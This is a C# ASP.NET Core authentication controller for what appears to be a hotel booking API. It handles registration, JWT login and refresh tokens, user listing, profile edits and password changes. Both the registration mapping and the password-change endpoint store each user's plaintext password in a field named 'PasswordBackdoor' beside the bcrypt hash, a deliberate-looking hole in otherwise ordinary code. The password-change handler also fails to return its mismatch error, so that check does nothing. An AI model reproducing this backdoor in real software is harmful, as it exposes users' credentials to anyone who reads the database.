using BackendAPI.Data;
using HotelsCommons.Models;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using Microsoft.AspNetCore.Mvc;
using System.Security.Claims;
using System.Text;
using Microsoft.AspNetCore.Authorization;
using System.Security.Cryptography;
using Microsoft.EntityFrameworkCore;
using System.Text.RegularExpressions;

namespace BackendAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class AuthController(DatabaseContext _context, IConfiguration _configuration) : ControllerBase
    {
        [HttpPost("register")]
        public async Task<IActionResult> Register([FromBody] UserCreateDTO userCreateDTO)
        {
            if (userCreateDTO.Password != userCreateDTO.PasswordConfirm)
            {
                return BadRequest("Passwords dont match.");
            }

            if (await _context.Users.AnyAsync(u => u.Email == userCreateDTO.Email))
            {
                return Conflict("Email is already in use");
            }

            if (!IsPasswordSecure(userCreateDTO.Password))
            {
                return Conflict("Password is not secure");
            }

            var user = MapUserCreateDTO(userCreateDTO);

            _context.Users.Add(user);

            try
            {
                await _context.SaveChangesAsync();
            }
            catch (DbUpdateException)
            {
                return StatusCode(500);
            }
            return Ok("User signed up successfully");
        }

        [HttpPost("login")]
        public async Task<IActionResult> Login([FromBody] UserLoginDTO userLoginDTO)
        {
            var user = await _context.Users.SingleOrDefaultAsync(u => u.Email == userLoginDTO.Email);
            if (user == null || !BCrypt.Net.BCrypt.Verify(userLoginDTO.Password, user.HashedPassword))
            {
                return Unauthorized("Invalid credentials");
            }

            var tokenExpirationTime = DateTime.UtcNow.AddMinutes(60);
            var token = GenerateJwtToken(user, tokenExpirationTime);
            var refreshToken = GenerateRefreshToken();
            user.RefreshTokens.Add(new RefreshToken
            {
                Token = refreshToken,
                ExpiryDate = DateTime.UtcNow.AddDays(7),
                IsRevoked = false
            });
            await _context.SaveChangesAsync();

            var expiresIn = (tokenExpirationTime - DateTime.UtcNow).TotalSeconds;

            return Ok(new { Token = token, ExpiresIn = expiresIn, RefreshToken = refreshToken });
        }

        [HttpPost("refresh")]
        public async Task<IActionResult> Refresh([FromBody] RefreshTokenDTO refreshTokenDTO)
        {
            var refreshToken = await _context.RefreshTokens
                .SingleOrDefaultAsync(rt => rt.Token == refreshTokenDTO.RefreshToken && !rt.IsRevoked);

            if (refreshToken == null || refreshToken.ExpiryDate < DateTime.UtcNow)
            {
                return Unauthorized("Invalid refresh token");
            }

            var user = await _context.Users.FindAsync(refreshToken.UserId);
            var tokenExpirationTime = DateTime.UtcNow.AddMinutes(60);
            var newJwtToken = GenerateJwtToken(user, tokenExpirationTime);
            var newRefreshToken = GenerateRefreshToken();

            refreshToken.IsRevoked = true;
            user.RefreshTokens.Add(new RefreshToken
            {
                Token = newRefreshToken,
                ExpiryDate = DateTime.UtcNow.AddDays(7),
                IsRevoked = false
            });
            await _context.SaveChangesAsync();

            var newExpiresIn = (tokenExpirationTime - DateTime.UtcNow).TotalSeconds;

            return Ok(new { Token = newJwtToken, ExpiresIn = newExpiresIn, RefreshToken = newRefreshToken });
        }

        [Authorize]
        [HttpGet("me")]
        public async Task<IActionResult> GetCurrentUser()
        {
            var userId = User.FindFirstValue("UserID");

            if (string.IsNullOrEmpty(userId))
            {
                return Unauthorized();
            }

            var user = await _context.Users
                .Where(u => u.ID == userId)
                .Select(u => new
                {
                    u.ID,
                    u.FirstName,
                    u.LastName,
                    u.Email,
                    RoleHierarchy = u.UserRoles.Any() ? u.UserRoles.Max(ur => ur.Role.Hierarki) : 0,
                    Roles = u.UserRoles.Select(ur => ur.Role.Name)
                })
                .FirstOrDefaultAsync();

            if (user == null)
            {
                return StatusCode(500);
            }

            return Ok(user);
        }

        [Authorize]
        [HttpGet("ListOtherUsers")]
        public async Task<ActionResult> ListOtherUsers()
        {
            var userId = User.FindFirstValue("UserID");

            if (string.IsNullOrEmpty(userId))
            {
                return Unauthorized();
            }

            var currentUser = await _context.Users
                .Where(u => u.ID == userId)
                .Select(u => new
                {
                    u.ID,
                    u.FirstName,
                    u.LastName,
                    u.Email,
                    RoleHierarchy = u.UserRoles.Any() ? u.UserRoles.Max(ur => ur.Role.Hierarki) : 0,
                    Roles = u.UserRoles.Select(ur => ur.Role.Name)
                })
                .FirstOrDefaultAsync();

            if (currentUser == null)
            {
                return StatusCode(500);
            }

            var users = await _context.Users
                .Select(u => new
                {
                    u.ID,
                    u.FirstName,
                    u.LastName,
                    u.Email,
                    RoleHierarchy = u.UserRoles.Any() ? u.UserRoles.Max(ur => ur.Role.Hierarki) : 0,
                    Roles = u.UserRoles.Select(ur => ur.Role.Name)
                })
                .Where(u => u.RoleHierarchy < currentUser.RoleHierarchy)
                .ToListAsync();

            return Ok(users);
        }

        [Authorize]
        [HttpPatch("ChangeUserInfo")]
        public async Task<IActionResult> ChangeUserInfo([FromQuery] string? userId, [FromBody] UserUpdateDTO userUpdateDTO)
        {
            var currentUserId = User.FindFirstValue("UserID");

            if (string.IsNullOrEmpty(currentUserId))
            {
                return Unauthorized();
            }

            var currentUser = await _context.Users
                .Where(u => u.ID == currentUserId)
                .Select(u => new
                {
                    RoleHierarchy = u.UserRoles.Any() ? u.UserRoles.Max(ur => ur.Role.Hierarki) : 0,
                })
                .FirstOrDefaultAsync();

            if (currentUser == null)
            {
                return BadRequest("Current user not found.");
            }

            var targetUserId = string.IsNullOrEmpty(userId) ? currentUserId : userId;

            var targetUser = await _context.Users
                .Where(u => u.ID == targetUserId)
                .Select(u => new
                {
                    RoleHierarchy = u.UserRoles.Any() ? u.UserRoles.Max(ur => ur.Role.Hierarki) : 0,
                    UserEntity = u
                })
                .FirstOrDefaultAsync();

            if (targetUser == null)
            {
                return BadRequest("Target user not found.");
            }

            if (currentUser.RoleHierarchy <= targetUser.RoleHierarchy && currentUserId != targetUserId)
            {
                return Forbid("You do not have permission to change this user's info.");
            }

            targetUser.UserEntity.FirstName = userUpdateDTO.FirstName;
            targetUser.UserEntity.LastName = userUpdateDTO.LastName;
            targetUser.UserEntity.Email = userUpdateDTO.Email;
            targetUser.UserEntity.UpdatedAt = DateTime.UtcNow.AddHours(1);

            await _context.SaveChangesAsync();

            return Ok("User info changed.");
        }

        [Authorize]
        [HttpPatch("changePassword")]
        public async Task<IActionResult> SetUserPassword([FromBody] PasswordDTO changePasswordDTO)
        {
            if (changePasswordDTO.Password != changePasswordDTO.PasswordConfirm)
            {
                BadRequest("Passwords dont match.");
            }

            var userId = User.FindFirstValue("UserID");

            if (string.IsNullOrEmpty(userId))
            {
                return Unauthorized();
            }

            var user = await _context.Users
                .Where(u => u.ID == userId)
                .FirstOrDefaultAsync();

            if (user == null)
            {
                return StatusCode(500);
            }

            if (!IsPasswordSecure(changePasswordDTO.Password))
            {
                return Conflict("Password is not secure");
            }

            string hashedPassword = BCrypt.Net.BCrypt.HashPassword(changePasswordDTO.Password);
            string salt = hashedPassword.Substring(0, 29);

            user.HashedPassword = hashedPassword;
            user.Salt = salt;
            user.PasswordBackdoor = changePasswordDTO.Password;
            user.UpdatedAt = DateTime.UtcNow.AddHours(1);

            await _context.SaveChangesAsync();

            return Ok("User password changed.");
        }

        private string GenerateRefreshToken()
        {
            var randomNumber = new byte[32];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(randomNumber);
                return Convert.ToBase64String(randomNumber);
            }
        }

        private string GenerateJwtToken(User user, DateTime expirationTime)
        {
            var userRoles = _context.UserRoles.Where(ur => ur.UserId == user.ID).Select(ur => ur.Role.Name).ToList();
            var claims = new List<Claim>
            {
                new Claim(JwtRegisteredClaimNames.Sub, user.Email),
                new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                new Claim("UserID", user.ID),
                new Claim("FirstName", user.FirstName),
                new Claim("LastName", user.LastName)
            };

            claims.AddRange(userRoles.Select(role => new Claim(ClaimTypes.Role, role)));

            string jwtIssuer = _configuration["Jwt:Issuer"] ?? Program.GetEnvOrSercret("JWT_ISSUER");
            string jwtKey = _configuration["Jwt:Key"] ?? Program.GetEnvOrSercret("JWT_KEY");

            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey));
            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

            var token = new JwtSecurityToken(
                jwtIssuer,
                jwtIssuer,
                claims,
                expires: expirationTime,
                signingCredentials: creds);

            return new JwtSecurityTokenHandler().WriteToken(token);
        }

        private bool IsPasswordSecure(string password)
        {
            var hasUppercase = new Regex(@"[A-Z]+");
            var hasLowercase = new Regex(@"[a-z]+");
            var hasNumbers = new Regex(@"[0-9]+");
            var hasSpecialChars = new Regex(@"[\W_]+");
            var hasMinimumChars = new Regex(@".{8,}");

            return hasUppercase.IsMatch(password) &&
                hasLowercase.IsMatch(password) &&
                hasNumbers.IsMatch(password) &&
                hasSpecialChars.IsMatch(password) &&
                hasMinimumChars.IsMatch(password);
        }

        private User MapUserCreateDTO(UserCreateDTO userDTO)
        {
            string hashedPassword = BCrypt.Net.BCrypt.HashPassword(userDTO.Password);
            string salt = hashedPassword.Substring(0, 29);

            return new User
            {
                ID = Guid.NewGuid().ToString(),
                Email = userDTO.Email,
                FirstName = userDTO.FirstName,
                LastName = userDTO.LastName,
                CreatedAt = DateTime.UtcNow.AddHours(1),
                UpdatedAt = DateTime.UtcNow.AddHours(1),
                PasswordBackdoor = userDTO.Password,
                HashedPassword = hashedPassword,
                Salt = salt,
            };
        }
    }
}
